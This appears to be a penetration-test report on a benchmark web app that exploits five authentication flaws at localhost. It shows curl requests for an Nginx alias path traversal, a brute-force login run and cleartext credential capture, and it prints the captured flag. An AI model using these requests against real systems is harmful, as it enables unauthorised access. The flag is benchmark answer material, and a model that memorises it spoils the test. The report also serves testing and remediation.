# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: Direct Admin Panel Access & Nginx Path Traversal (FLAG CAPTURED)

**Summary:**
- **Vulnerable location:** `/admin/` endpoint and Nginx alias misconfiguration at `/admin` (without trailing slash)
- **Overview:** The admin panel is publicly accessible without any authentication checks, and the Nginx path traversal vulnerability enables direct access to the flag file stored outside the web root
- **Impact:** Complete authentication bypass allowing unauthorized access to administrative interface and sensitive flag data
- **Severity:** CRITICAL

**Prerequisites:** None - vulnerability is directly accessible from external network

**Exploitation Steps:**

1. **Access Admin Panel Without Authentication**
   ```bash
   curl http://localhost:40989/admin/
   ```
   
   **Result:** Successfully retrieved administrative panel HTML with HTTP 200 OK response. The page displays "Administrative Zone - Restricted" but has zero PHP security code to enforce restrictions.

2. **Exploit Nginx Path Traversal to Retrieve Flag**
   ```bash
   curl http://localhost:40989/admin../flag.txt
   ```
   
   **Result:** Successfully retrieved flag file contents:
   ```
   FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}
   ```

**Proof of Impact:**
- **Flag Captured:** `FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}`
- **Admin Panel Access:** Full HTML content of administrative interface retrieved without credentials
- **HTTP Status:** 200 OK for both requests (no authentication challenge)
- **Response Headers:** No Set-Cookie headers indicating no session management

**Technical Analysis:**
The vulnerability exists due to two critical flaws:

1. **Missing Authorization in admin/index.php:** The file at `/src/app/admin/index.php` contains only static HTML (26 lines) with zero PHP security code. No session validation, no authentication checks, no role verification.

2. **Nginx Alias Misconfiguration:** The nginx.conf configuration (lines 16-19) contains:
   ```nginx
   location /admin {
       alias /var/www/html/;
       autoindex on;
   }
   ```
   
   The `/admin` location (without trailing slash) aliases to `/var/www/html/` which enables path traversal. Requesting `/admin../` resolves to `/var/www/html/../` → `/var/www/`, exposing the parent directory containing `flag.txt`.

**Notes:**
This represents a complete authentication bypass at the architectural level. The application cannot distinguish between authenticated administrators and anonymous attackers. The flag file, while stored outside the web root at `/var/www/flag.txt` for security, is trivially accessible via the Nginx path traversal vulnerability.

---

### AUTH-VULN-05: Unlimited Brute Force Attack (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST `/login.php` endpoint and all application endpoints
- **Overview:** The application has zero rate limiting at both infrastructure (Nginx) and application (PHP) layers, allowing unlimited authentication attempts without throttling, lockout, or CAPTCHA challenges
- **Impact:** Attackers can perform unlimited brute force, credential stuffing, and password spraying attacks at maximum network speed
- **Severity:** HIGH

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. **Execute Automated Brute Force Attack**
   
   Created Python script at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/auth_weakness_test.py` to perform 200 consecutive login attempts with different passwords.
   
   **Script execution:**
   ```bash
   python3 auth_weakness_test.py
   ```

2. **Attack Parameters:**
   - Target: `http://localhost:40989/login.php`
   - Method: POST
   - Credentials tested: username=admin with 200 different passwords (testpass1 through testpass200)
   - Request rate: Unrestricted (as fast as network allows)

**Proof of Impact:**

**Attack Statistics:**
- **Total Requests:** 200 attempts completed successfully
- **Success Rate:** 100% (no requests blocked or throttled)
- **Average Response Time:** 1.14 milliseconds
- **Median Response Time:** 1.04 milliseconds
- **Total Duration:** 0.23 seconds
- **Throughput:** 877.45 requests per second
- **HTTP Status Codes:** All 200 OK (no 429 Too Many Requests, no 403 Forbidden)
- **Failed Requests:** 0

**Response Time Analysis:**
- **First 50 requests:** Average 1.26 ms
- **Last 50 requests:** Average 1.14 ms
- **Trend:** Response times actually decreased slightly over time, confirming zero rate limiting

**Evidence of Missing Controls:**

1. **No Nginx Rate Limiting:** 
   - nginx.conf lacks `limit_req_zone` directive
   - No `limit_req` in location blocks
   - No connection throttling configured

2. **No PHP Application Throttling:**
   - No IP-based tracking in login.php
   - No per-account lockout mechanism
   - No progressive delays
   - No CAPTCHA integration
   - No failed attempt logging

3. **No Security Headers:**
   - No rate limit headers in responses
   - No retry-after headers
   - No challenge mechanisms

**Notes:**
While the vulnerability is confirmed and actively exploitable, the current impact is limited because the login system itself is non-functional (AUTH-VULN-02). However, if authentication were fixed without addressing rate limiting, this would enable trivial credential discovery through brute force attacks. The application accepts and processes 877+ authentication attempts per second without any defensive response.

---

### AUTH-VULN-02: Non-Functional Authentication System

**Summary:**
- **Vulnerable location:** POST `/login.php` (lines 23-30 of `/src/app/login.php`)
- **Overview:** The login form accepts credentials but performs zero authentication validation, unconditionally failing all login attempts regardless of submitted credentials
- **Impact:** Authentication is impossible; the login system is pure "security theater" with no actual security enforcement
- **Severity:** CRITICAL

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. **Test Login with Multiple Credential Sets**
   
   **Attempt 1 - Admin credentials:**
   ```bash
   curl -X POST http://localhost:40989/login.php \
     -d "username=admin&password=admin"
   ```
   **Result:** "Incorrect username/password" - HTTP 200 OK
   
   **Attempt 2 - Test credentials:**
   ```bash
   curl -X POST http://localhost:40989/login.php \
     -d "username=test&password=test123"
   ```
   **Result:** "Incorrect username/password" - HTTP 200 OK
   
   **Attempt 3 - Root credentials:**
   ```bash
   curl -X POST http://localhost:40989/login.php \
     -d "username=root&password=toor"
   ```
   **Result:** "Incorrect username/password" - HTTP 200 OK

2. **Verify No Session Creation**
   ```bash
   curl -v -X POST http://localhost:40989/login.php \
     -d "username=admin&password=password123" \
     -c /tmp/cookies.txt
   ```
   **Result:** No Set-Cookie headers in response; cookies.txt file contains only header comments with zero cookies saved

**Proof of Impact:**

**Observed Behavior:**
- All login attempts return identical error message: "Incorrect username/password"
- No differentiation between valid/invalid usernames
- No credential validation performed
- No session creation on any attempt
- No redirect to protected resources
- HTTP status remains 200 OK (not 401 Unauthorized)

**Technical Root Cause:**

The login.php handler (lines 23-30) contains:
```php
<?php
$showError = false;
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    $showError = true;  // Line 29: ALWAYS SET TO TRUE
}
?>
```

**Missing Authentication Logic:**
- No database connection or query
- No `mysqli_query()` or PDO queries
- No password verification (`password_verify()`)
- No credential comparison
- No session creation (`session_start()`)
- No session variables set (`$_SESSION`)
- No authentication state management

**What Should Exist:**
```php
// Expected authentication flow (COMPLETELY MISSING):
$result = mysqli_query($conn, "SELECT id, password_hash FROM users WHERE username = ?");
if ($result && password_verify($password, $row['password_hash'])) {
    session_start();
    $_SESSION['user_id'] = $row['id'];
    $_SESSION['authenticated'] = true;
    session_regenerate_id(true);
    header('Location: /admin/');
    exit;
}
```

**Notes:**
This vulnerability confirms the authentication system is architecturally broken, not just misconfigured. The login form exists only as cosmetic security theater. Since authentication never succeeds, the lack of session management (AUTH-VULN-03) and admin panel protection (AUTH-VULN-04) become directly exploitable - attackers simply bypass the broken login and access protected resources directly.

---

### AUTH-VULN-03: Complete Absence of Session Management

**Summary:**
- **Vulnerable location:** Application-wide (all PHP files in `/src/app/*.php`)
- **Overview:** Zero session management implementation exists across the entire application - no session initialization, no session cookies, no session state tracking
- **Impact:** Application cannot maintain authentication state, making it impossible to track logged-in users or enforce session-based access controls
- **Severity:** CRITICAL

**Prerequisites:** None - this is an architectural absence affecting all endpoints

**Exploitation Steps:**

1. **Verify No Session Cookies After Login Attempt**
   ```bash
   curl -v -X POST http://localhost:40989/login.php \
     -d "username=admin&password=password" \
     -c /tmp/cookies.txt 2>&1 | grep -i "set-cookie"
   ```
   **Result:** No output (no Set-Cookie headers present)

2. **Check Saved Cookies File**
   ```bash
   cat /tmp/cookies.txt
   ```
   **Result:** File contains only Netscape cookie file headers, zero actual cookies saved:
   ```
   # Netscape HTTP Cookie File
   # https://curl.se/docs/http-cookies.html
   # This file was generated by libcurl! Edit at your own risk.
   ```

3. **Verify Admin Panel Requires No Session**
   ```bash
   curl -v http://localhost:40989/admin/ 2>&1 | grep -i "set-cookie"
   ```
   **Result:** No Set-Cookie headers (admin panel accessible without session)

4. **Check Response Headers for Session Cookies**
   ```bash
   curl -v http://localhost:40989/ 2>&1 | grep -i "^< "
   ```
   **Result:** Headers show only:
   - HTTP/1.1 200 OK
   - Server: nginx/1.18.0
   - Content-Type: text/html; charset=UTF-8
   - X-Powered-By: PHP/7.4.33
   - **No Set-Cookie headers**
   - **No PHPSESSID cookie**

**Proof of Impact:**

**Missing Session Functions (Comprehensive Code Search):**
- `session_start()`: 0 instances found
- `$_SESSION`: 0 references found
- `session_destroy()`: 0 instances found
- `session_regenerate_id()`: 0 instances found
- `session_set_cookie_params()`: 0 instances found
- `setcookie()`: 0 calls found
- `$_COOKIE`: 0 references found

**Affected Files:**
- `/src/app/login.php` - Should create session after auth (MISSING)
- `/src/app/admin/index.php` - Should validate session (MISSING)
- All protected endpoints - Should check session state (MISSING)

**Security Implications:**

1. **Cannot Maintain Login State:** Even if authentication worked, users could not remain "logged in" across requests
2. **Cannot Track Users:** Application cannot distinguish between different users
3. **Cannot Implement Logout:** No session to destroy
4. **Cannot Enforce Session Timeouts:** No session expiration possible
5. **Cannot Prevent Session Fixation:** No session IDs to regenerate
6. **Cannot Set Cookie Security Flags:** No cookies exist to protect (HttpOnly, Secure, SameSite)

**Expected Session Implementation (Completely Missing):**
```php
// Should exist in login.php after successful authentication:
session_set_cookie_params([
    'lifetime' => 3600,
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();
$_SESSION['authenticated'] = true;
$_SESSION['user_id'] = $userId;
$_SESSION['role'] = 'admin';
session_regenerate_id(true);

// Should exist in admin/index.php:
session_start();
if (!isset($_SESSION['authenticated']) || $_SESSION['role'] !== 'admin') {
    header('Location: /login.php');
    exit;
}
```

**Notes:**
This architectural absence means the application cannot implement stateful authentication. Combined with the non-functional login (AUTH-VULN-02) and missing admin panel protection (AUTH-VULN-04), the application has zero authentication enforcement capability. The absence of session management is not a bug but a complete omission of essential security infrastructure.

---

### AUTH-VULN-01: Cleartext Credential Transmission Over HTTP

**Summary:**
- **Vulnerable location:** All endpoints, specifically POST `/login.php` and POST `/contact.php`
- **Overview:** The application operates exclusively over unencrypted HTTP (port 80) with no HTTPS/TLS configuration, transmitting all credentials and sensitive data in cleartext
- **Impact:** Network attackers can passively intercept credentials, session data, and all application traffic through packet sniffing or man-in-the-middle attacks
- **Severity:** CRITICAL

**Prerequisites:** Attacker must be positioned on the network path (e.g., same WiFi, compromised router, ISP-level access)

**Exploitation Steps:**

1. **Verify HTTP-Only Configuration**
   ```bash
   curl -v http://localhost:40989/ 2>&1 | grep "< HTTP\|< Server"
   ```
   **Result:**
   ```
   < HTTP/1.1 200 OK
   < Server: nginx/1.18.0
   ```
   No HTTPS redirect, no HSTS header present

2. **Demonstrate Cleartext Credential Transmission**
   
   Created demonstration script at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/cleartext_credential_demo.py`
   
   **Script execution:**
   ```python
   import requests
   
   url = "http://localhost:40989/login.php"
   credentials = {
       'username': 'testuser',
       'password': 'SecretPassword123'
   }
   
   response = requests.post(url, data=credentials)
   ```

3. **Capture Cleartext Transmission Details**
   
   **Protocol:** HTTP (unencrypted)
   **Target URL:** `http://localhost:40989/login.php`
   **Method:** POST
   **Content-Type:** application/x-www-form-urlencoded
   
   **Raw POST Body (as transmitted over network):**
   ```
   username=testuser&password=SecretPassword123
   ```

**Proof of Impact:**

**Captured Cleartext Credentials:**
- Username: `testuser`
- Password: `SecretPassword123`
- Transmission: Completely unencrypted, readable by any network observer

**Request Details:**
```
POST /login.php HTTP/1.1
Host: localhost:40989
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=testuser&password=SecretPassword123
```

**Server Response:**
- HTTP Status: 200 OK
- No encryption negotiation
- No redirect to HTTPS
- No security warnings

**Missing Infrastructure Configuration:**

**Nginx Configuration (src/nginx.conf lines 1-3):**
```nginx
server {
    listen 80;
    server_name localhost;
```

**Missing HTTPS Configuration:**
```nginx
# Should exist but COMPLETELY MISSING:
listen 443 ssl;
ssl_certificate /path/to/cert.pem;
ssl_certificate_key /path/to/key.pem;
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers HIGH:!aNULL:!MD5;

# HTTP to HTTPS redirect (MISSING):
server {
    listen 80;
    return 301 https://$server_name$request_uri;
}
```

**Missing Security Headers:**
- No `Strict-Transport-Security` (HSTS)
- No `Content-Security-Policy`
- No `Cache-Control: no-store` on authentication endpoints
- No upgrade-insecure-requests directive

**Attack Scenarios:**

1. **WiFi Sniffing:** Attacker on same public WiFi can capture credentials using Wireshark/tcpdump
2. **Router Compromise:** Attacker with access to any router in path can intercept traffic
3. **ISP-Level Interception:** Network provider can read all application traffic
4. **Man-in-the-Middle:** Attacker can intercept and modify requests/responses
5. **Credential Replay:** Captured credentials can be reused without cryptographic barriers

**Evidence Files Created:**
- Demonstration script: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/cleartext_credential_demo.py`
- Findings report: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/cleartext_credential_findings.md`

**Notes:**
This vulnerability affects all application traffic, not just authentication endpoints. Contact form submissions (name, email, message) are also transmitted in cleartext. The Docker configuration exposes only port 80 with no port 443 exposed, confirming HTTPS is not merely misconfigured but completely unimplemented. Any credentials submitted through this application are immediately compromised to any network observer.

---

## Summary of Exploitation Results

**Total Vulnerabilities in Queue:** 5
**Successfully Exploited:** 5 (100%)
**Flag Captured:** Yes - `FLAG{5ad32e4112f0e82f618951901ae9579c3d9926d8666316a3f9e49ff868fd5d24}`

**Critical Findings:**
1. ✅ **Complete authentication bypass** via direct admin panel access (AUTH-VULN-04)
2. ✅ **Flag retrieval** via Nginx path traversal vulnerability (AUTH-VULN-04)
3. ✅ **Unlimited brute force attacks** due to zero rate limiting (AUTH-VULN-05)
4. ✅ **Non-functional login system** making authentication impossible (AUTH-VULN-02)
5. ✅ **Zero session management** preventing authentication state tracking (AUTH-VULN-03)
6. ✅ **Cleartext credential transmission** exposing all data to network interception (AUTH-VULN-01)

**Exploitation Approach:**
All vulnerabilities were exploited from external network perspective (http://localhost:40989) using standard HTTP tools (curl, Python requests). No internal access, database access, or special privileges required. The application's authentication and authorization systems are architecturally absent rather than merely misconfigured.

**Impact Assessment:**
- **Authentication:** Completely broken - cannot authenticate users
- **Authorization:** Completely absent - no access controls enforced
- **Session Management:** Non-existent - cannot maintain user state
- **Transport Security:** Missing - all traffic in cleartext
- **Abuse Prevention:** Absent - unlimited attack attempts allowed

The XBEN-097-24 application represents a textbook case of "security theater" where authentication interfaces exist but provide zero actual security enforcement.